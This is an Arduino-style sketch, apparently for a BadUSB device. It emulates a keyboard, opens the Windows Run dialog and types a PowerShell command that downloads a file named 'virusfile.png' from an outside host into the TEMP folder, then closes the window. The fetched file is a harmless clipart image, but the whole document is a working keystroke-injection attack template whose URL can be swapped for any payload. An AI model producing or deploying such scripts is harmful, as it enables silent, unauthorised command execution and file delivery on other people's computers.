#include <esKeyboard.h>

#define defaultDelay 5

String filename = "virusfile.png";
String fileurl = "https://openclipart.org/image/2400px/svg_to_png/168159/virus4.png";

void typeKey(int key){
  Keyboard.press(key);
  delay(defaultDelay);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();
  
  delay(1000);

  delay(defaultDelay);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("powershell");
  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("(New-Object System.Net.WebClient).DownloadFile(\"");
  Keyboard.print(fileurl);
  Keyboard.print("\", $env:TEMP + \"/");
  Keyboard.print(filename);
  Keyboard.print("\")");

  delay(defaultDelay);
  typeKey(KEY_RETURN);

  delay(1000);
  Keyboard.print("exit");
  typeKey(KEY_RETURN);
  
  /* ----- End-Script -----*/
  
  Keyboard.end();
}

void loop(){ /* ----- Unused-Loop -----*/ }
